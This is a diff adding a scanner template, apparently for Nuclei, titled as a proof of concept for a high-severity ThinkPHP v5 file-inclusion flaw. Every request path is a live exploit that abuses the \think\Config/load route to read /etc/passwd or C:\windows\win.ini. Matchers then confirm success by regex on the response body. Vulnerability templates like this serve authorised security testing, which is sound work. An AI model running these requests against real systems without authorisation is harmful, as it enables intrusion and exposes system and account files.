@@ -1,0 +1,30 @@
+id: poc-local-thinkphp-v5-think-Config-load-file-include
+
+info:
+  name: poc-local-thinkphp-v5-think-Config-load-file-include
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?s=index/\think\Config/load&file=/etc/passwd'
+      - '{{BaseURL}}/?s=index/\think\Config/load&file=C:\windows\win.ini'
+      - '{{BaseURL}}/public/index.php?s=index/\think\Config/load&file=/etc/passwd'
+      - '{{BaseURL}}/public/index.php?s=index/\think\Config/load&file=C:\windows\win.ini'
+      - '{{BaseURL}}/?s=\think\Config/load&file=/etc/passwd'
+      - '{{BaseURL}}/?s=\think\Config/load&file=C:\windows\win.ini'
+    
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+        part: body
